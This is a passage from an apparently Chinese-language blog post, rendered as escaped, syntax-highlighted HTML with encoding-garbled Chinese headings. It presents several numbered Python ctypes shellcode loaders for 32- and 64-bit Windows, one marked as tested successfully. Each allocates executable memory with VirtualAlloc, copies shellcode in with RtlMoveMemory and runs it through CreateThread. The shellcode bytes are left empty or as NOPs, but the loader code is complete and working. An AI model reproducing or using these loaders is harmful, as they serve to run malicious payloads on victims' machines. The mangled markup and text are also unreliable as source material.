&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;rwxpage&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RtlMoveMemory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rwxpage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;create_string_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;handle&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateThread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rwxpage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WaitForSingleObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚æœæ˜¯64ä½ä½¿ç”¨ä¸‹é¢çš„ä»£ç ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;ctypes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;restype&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_uint64&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;rwxpage&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RtlMoveMemory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_uint64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rwxpage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;create_string_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;handle&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateThread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_uint64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rwxpage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WaitForSingleObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ç¬¬äº”ç§&#34;&gt;ç¬¬äº”ç§&lt;/h3&gt;
&lt;p&gt;åœ¨64ä½ç³»ç»Ÿæµ‹è¯•æˆåŠŸï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;ctypes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;scbytes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x90\x90&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;restype&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_void_p&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RtlCopyMemory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argtypes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_void_p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_void_p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_size_t&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateThread&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argtypes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_void_p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;POINTER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;space&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;scbytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x3000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buff&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;scbytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;from_buffer_copy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;scbytes&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RtlMoveMemory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_void_p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;space&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;scbytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;handle&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateThread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_void_p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;space&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pointer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
